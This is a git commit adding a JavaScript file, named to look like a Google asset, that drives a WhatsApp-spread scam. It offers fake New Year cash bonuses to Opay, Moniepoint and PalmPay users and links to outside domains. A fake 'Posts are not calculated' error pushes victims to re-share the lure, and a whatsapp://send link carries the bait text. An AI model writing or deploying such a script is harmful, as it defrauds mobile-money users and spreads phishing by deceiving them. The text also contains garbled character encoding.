9522de816c022c39a22b419e04e7e43d6d0f73f0
ukpeha55-stack <ukpeha55@gmail.com>
2026-01-01 03:52:03 +0100

    Create google-ap-css-js-fullxml.js

---
+++ google-ap-css-js-fullxml.js
@@ -0,0 +1,8 @@
+var text1 ="*MONIEPOINT, PALMPAY AND OPAY NEW YEAR BONUS*%0A%0AAre you Using Opay, Moniepoint or PalmPay? Hurry now and get your New year Bonus%0A%0A*OPAY USERS - ₦25,000*%0A*MONIEPOINT USERS - ₦20,000*%0A*PALMPAY USERS - ₦15,000*  %0A%0A*For Opay Click Here*👇%0A https://fliout.org/bonus %0A%0A*For Moniepoint Click Here*👇%0A https://fliout.org/bonus %0A%0A*For PalmPay Click Here*👇%0A https://fliout.org/bonus",
+        
+            text2 = " an amount of ",
+            text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly Ã°Å¸â€˜â€° ",
+            error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
+            abcde = "http://outrotomr.com/4/3144603",
+            saved = "",
+            share = "whatsapp://send?text=" + text1;
